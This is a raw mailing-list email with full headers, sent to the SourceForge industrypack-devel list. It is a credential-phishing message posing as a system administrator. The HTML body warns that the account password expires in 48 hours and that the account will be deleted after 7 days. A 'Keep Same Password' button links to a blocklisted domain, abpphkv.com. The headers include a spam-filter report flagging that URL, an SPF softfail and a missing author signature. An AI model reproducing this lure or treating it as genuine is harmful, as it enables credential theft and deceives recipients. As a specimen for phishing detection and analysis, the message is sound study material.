Return-Path: <industrypack-devel-bounces@lists.sourceforge.net>
X-Original-To: lists+industrypack-devel@lfdr.de
Delivered-To: lists+industrypack-devel@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id CFC33944D27
	for <lists+industrypack-devel@lfdr.de>; Thu,  1 Aug 2024 15:28:39 +0200 (CEST)
Received: from [127.0.0.1] (helo=sfs-ml-2.v29.lw.sourceforge.com)
	by sfs-ml-2.v29.lw.sourceforge.com with esmtp (Exim 4.95)
	(envelope-from <industrypack-devel-bounces@lists.sourceforge.net>)
	id 1sZVrC-0003Qd-Ks
	for lists+industrypack-devel@lfdr.de;
	Thu, 01 Aug 2024 13:28:38 +0000
Received: from [172.30.29.66] (helo=mx.sourceforge.net)
 by sfs-ml-2.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
 TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.95)
 (envelope-from <admin@lists.sourceforge.net>) id 1sZVrB-0003QP-9G
 for industrypack-devel@lists.sourceforge.net;
 Thu, 01 Aug 2024 13:28:37 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=Content-Transfer-Encoding:Content-Type:MIME-Version
 :Message-ID:Date:Subject:To:From:Sender:Reply-To:Cc:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
 List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=/IAn5PN0W6F9hRizG3LMenzzvDnBDyOtgOZz9OEFAEU=; b=P92wfaBWp4+WSLgEP4RFxUzOyE
 ZAjZvf3WvgCrwt6i5QtTALPD54PdDtueGGeyNDnds/GnHBu/7CgWTDhnlmc3CHkUo6t7lZRjv5l2e
 6J0/TFexwhIs0lT/pKELwmt66HoiAi53wtKu8f8O1Nq3SZUgxqNWlvEzEQlRcutRG4XI=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=Content-Transfer-Encoding:Content-Type:MIME-Version:Message-ID:Date:
 Subject:To:From:Sender:Reply-To:Cc:Content-ID:Content-Description:Resent-Date
 :Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
 References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
 List-Owner:List-Archive; bh=/IAn5PN0W6F9hRizG3LMenzzvDnBDyOtgOZz9OEFAEU=; b=a
 W++f2V0BDi1wdrPc0r5oelQX1tjkUa6UBkByUdEPPynYJMlX7TQVu3Pi+B3IiGGxXsPWuGc9RsdHA
 CjtjGaCcb9dwIYll4ELqniuFxXyc0mts/F/KLvKnTGRIsn8TdhmwfWDwQbkMc7642Rxf+rgobc79r
 9XplYwojhlKsahjo=;
Received: from [188.127.237.180] (helo=s929116.srvape.com)
 by sfi-mx-2.v28.lw.sourceforge.com with esmtp (Exim 4.95)
 id 1sZVrA-00022s-AM for industrypack-devel@lists.sourceforge.net;
 Thu, 01 Aug 2024 13:28:37 +0000
Received: from promega.com (localhost [IPv6:::1])
 by s929116.srvape.com (Postfix) with ESMTP id 5EF1C2DA079
 for <industrypack-devel@lists.sourceforge.net>;
 Thu,  1 Aug 2024 14:52:37 +0300 (MSK)
To: industrypack-devel@lists.sourceforge.net
Date: 01 Aug 2024 04:52:31 -0700
Message-ID: <20240801045231.6086C336A7D682F8@lists.sourceforge.net>
MIME-Version: 1.0
X-Spam-Score: 2.4 (++)
X-Spam-Report: Spam detection software,
 running on the system "util-spamd-1.v13.lw.sourceforge.com", 
 has NOT identified this incoming email as spam.  The original
 message has been attached to this so you can view it or label
 similar future email.  If you have any questions, see
 the administrator of that system for details.
 Content preview:  Hello industrypack-devel,
 Your account industrypack-devel@lists.sourceforge.net
 password expires in 48hours. Kindly use the button below to continue with
 the same password. Keep Same Password 
 Content analysis details:   (2.4 points, 6.0 required)
 pts rule name              description
 ---- ---------------------- --------------------------------------------------
 0.0 URIBL_BLOCKED          ADMINISTRATOR NOTICE: The query to URIBL was
 blocked.  See
 http://wiki.apache.org/spamassassin/DnsBlocklists#dnsbl-block
 for more information. [URIs: abpphkv.com]
 0.0 URIBL_PH_SURBL         Contains an URL listed in the PH SURBL blocklist
 [URIs: abpphkv.com]
 1.9 URIBL_ABUSE_SURBL      Contains an URL listed in the ABUSE SURBL
 blocklist [URIs: abpphkv.com]
 1.1 DKIM_ADSP_ALL          No valid author signature, domain signs all mail
 0.0 RCVD_IN_VALIDITY_CERTIFIED_BLOCKED RBL: ADMINISTRATOR NOTICE:
 The query to Validity was blocked.  See
 https://knowledge.validity.com/hc/en-us/articles/20961730681243
 for more information.
 [188.127.237.180 listed in sa-accredit.habeas.com]
 1.0 SPF_SOFTFAIL           SPF: sender does not match SPF record (softfail)
 0.0 SPF_HELO_NONE          SPF: HELO does not publish an SPF Record
 0.0 RCVD_IN_VALIDITY_RPBL_BLOCKED RBL: ADMINISTRATOR NOTICE: The
 query to Validity was blocked.  See
 https://knowledge.validity.com/hc/en-us/articles/20961730681243
 for more information.
 [188.127.237.180 listed in bl.score.senderscore.com]
 0.1 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
 0.0 HTML_MESSAGE           BODY: HTML included in message
 -5.0 RCVD_IN_DNSWL_HI       RBL: Sender listed at https://www.dnswl.org/,
 high trust [188.127.237.180 listed in list.dnswl.org]
 1.3 RDNS_NONE Delivered to internal network by a host with no rDNS
 2.0 HTML_FONT_TINY_NORDNS  Font too small to read, no rDNS
 0.0 TO_NO_BRKTS_NORDNS_HTML To: lacks brackets and no rDNS and HTML
 only
 0.0 TO_EQ_FM_DOM_HTML_ONLY To domain == From domain and HTML only
X-Headers-End: 1sZVrA-00022s-AM
Subject: [Industrypack-devel] Server Administrator | IT Support
X-BeenThere: industrypack-devel@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: <industrypack-devel.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=industrypack-devel>
List-Post: <mailto:industrypack-devel@lists.sourceforge.net>
List-Help: <mailto:industrypack-devel-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=subscribe>
From: System Administrator via Industrypack-devel
 <industrypack-devel@lists.sourceforge.net>
Reply-To: System Administrator <admin@lists.sourceforge.net>
Content-Type: multipart/mixed; boundary="===============1284589100136083117=="
Errors-To: industrypack-devel-bounces@lists.sourceforge.net

--===============1284589100136083117==
Content-Type: text/html;
	charset="iso-8859-1"
Content-Transfer-Encoding: quoted-printable

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.=
w3.org/TR/html4/loose.dtd">

<HTML><HEAD>
<META name=3DGENERATOR content=3D"MSHTML 11.00.10570.1001"></HEAD>
<body style=3D"MARGIN: 0.5em">
<P>
<table style=3D"BOX-SIZING: border-box; FONT-SIZE: 12px; BORDER-TOP: rgb(20=
4,204,204) 1px solid; FONT-FAMILY: &quot;Lucida Grande&quot;, Verdana, Aria=
l, Helvetica, sans-serif; BORDER-RIGHT: rgb(204,204,204) 1px solid; WHITE-S=
PACE: normal; WORD-SPACING: 0px; BORDER-COLLAPSE: collapse; BORDER-BOTTOM: =
rgb(204,204,204) 1px solid; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: =
rgb(0,0,0); FONT-STYLE: normal; BORDER-SPACING: 0px; BORDER-LEFT: rgb(204,2=
04,204) 1px solid; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING:=20
normal; BACKGROUND-COLOR: rgb(255,255,255); font-variant-ligatures: normal;=
 font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration=
-thickness: initial; text-decoration-style: initial; text-decoration-color:=
 initial" cellspacing=3D"0" cellpadding=3D"0" width=3D"100%" bgcolor=3D"#ff=
ffff" border=3D"0">
<TBODY style=3D"BOX-SIZING: border-box">
<TR style=3D"BOX-SIZING: border-box">
<td style=3D"BOX-SIZING: border-box; FONT-SIZE: 13px; FONT-FAMILY: calibri;=
 BORDER-COLLAPSE: collapse; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-=
LEFT: 15px; MARGIN: 0px; LINE-HEIGHT: 27px; PADDING-RIGHT: 15px; BACKGROUND=
-COLOR: rgb(236,243,249)"><B style=3D"BOX-SIZING: border-box; FONT-WEIGHT: =
bolder">Hello<SPAN style=3D"BOX-SIZING: border-box">&nbsp;industrypack-deve=
l,</SPAN></B></TD></TR>
<TR style=3D"BOX-SIZING: border-box">
<td style=3D"BOX-SIZING: border-box; FONT-SIZE: 13px; FONT-FAMILY: calibri;=
 BORDER-COLLAPSE: collapse; PADDING-BOTTOM: 5px; PADDING-TOP: 0px; PADDING-=
LEFT: 15px; MARGIN: 0px; LINE-HEIGHT: 27px; PADDING-RIGHT: 15px; BACKGROUND=
-COLOR: rgb(236,243,249)">
<table style=3D"BOX-SIZING: border-box; FONT-SIZE: small; FONT-FAMILY: aria=
l, helvetica, sans-serif; BORDER-COLLAPSE: collapse" cellspacing=3D"0" cell=
padding=3D"0" width=3D"100%" border=3D"0">
<TBODY style=3D"BOX-SIZING: border-box">
<TR style=3D'BOX-SIZING: border-box; FONT-SIZE: 16px; FONT-FAMILY: "open sa=
ns", helveticaneue-light, "helvetica neue light", "helvetica neue", helveti=
ca, arial, "lucida grande", sans-serif; COLOR: rgb(64,64,64); LINE-HEIGHT: =
26px'>
<td style=3D"BOX-SIZING: border-box; MARGIN: 0px">
<P style=3D"BOX-SIZING: border-box; MARGIN-TOP: 0px"><FONT style=3D"BOX-SIZ=
ING: border-box; VERTICAL-ALIGN: inherit">Your account<SPAN style=3D"BOX-SI=
ZING: border-box">&nbsp;industrypack-devel@lists.sourceforge.net</SPAN><SPA=
N style=3D"BOX-SIZING: border-box">&nbsp;</SPAN>password expires in 48hours=
=2E<BR style=3D"BOX-SIZING: border-box">Kindly use the button below to cont=
inue with the same password.</FONT></P></TD></TR></TBODY></TABLE></TD></TR>=

<TR style=3D"BOX-SIZING: border-box">
<td style=3D"BOX-SIZING: border-box; BORDER-COLLAPSE: collapse; PADDING-BOT=
TOM: 10px; PADDING-TOP: 10px; PADDING-LEFT: 10px; MARGIN: 0px; PADDING-RIGH=
T: 10px" width=3D"300" align=3D"left">
<A style=3D'BOX-SIZING: border-box; FONT-SIZE: 15px; TEXT-DECORATION: none;=
 MAX-WIDTH: 210px; FONT-FAMILY: "open sans", "helvetica neue", arial; WIDTH=
: 210px; COLOR: white; OUTLINE-WIDTH: 0px; PADDING-BOTTOM: 14px; TEXT-ALIGN=
: center; PADDING-TOP: 14px; OUTLINE-STYLE: none; PADDING-LEFT: 7px; MARGIN=
: 0px; OUTLINE-COLOR: invert; PADDING-RIGHT: 7px; BACKGROUND-COLOR: darkblu=
e' href=3D"https://abpphkv.com/ato/Wp-images/?i=3Di&amp;0=3Dindustrypack-de=
vel@lists.sourceforge.net" rel=3Dnoreferrer target=3D_blank>
<FONT style=3D"BOX-SIZING: border-box; VERTICAL-ALIGN: inherit">Keep&nbsp;S=
ame Password&nbsp;</FONT></A></TD></TR>
<TR style=3D"BOX-SIZING: border-box">
<td style=3D"BOX-SIZING: border-box; FONT-SIZE: 0px; BORDER-COLLAPSE: colla=
pse; PADDING-BOTTOM: 5px; PADDING-TOP: 5px; PADDING-LEFT: 15px; MARGIN: 0px=
; LINE-HEIGHT: 0; PADDING-RIGHT: 15px">&nbsp;</TD></TR>
<TR style=3D"BOX-SIZING: border-box; MARGIN-TOP: 10px; BACKGROUND-COLOR: rg=
b(228,228,228)">
<td style=3D"BOX-SIZING: border-box; FONT-SIZE: 13px; FONT-FAMILY: calibri;=
 BORDER-COLLAPSE: collapse; PADDING-BOTTOM: 10px; PADDING-TOP: 10px; PADDIN=
G-LEFT: 15px; MARGIN: 0px; LINE-HEIGHT: 20px; PADDING-RIGHT: 15px">
<P style=3D"BOX-SIZING: border-box; MARGIN-TOP: 0px">&nbsp;</P>
<P style=3D"BOX-SIZING: border-box; MARGIN-TOP: 0px"><FONT style=3D"BOX-SIZ=
ING: border-box; VERTICAL-ALIGN: inherit">Account will be&nbsp; automatical=
ly deleted after 7days,&nbsp; You can change the frequency of these notific=
ations within your mailbox portal.</FONT></P></TD></TR></TBODY></TABLE><BR =
class=3DApple-interchange-newline></P></BODY></HTML>


--===============1284589100136083117==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline


--===============1284589100136083117==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Industrypack-devel mailing list
Industrypack-devel@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/industrypack-devel

--===============1284589100136083117==--
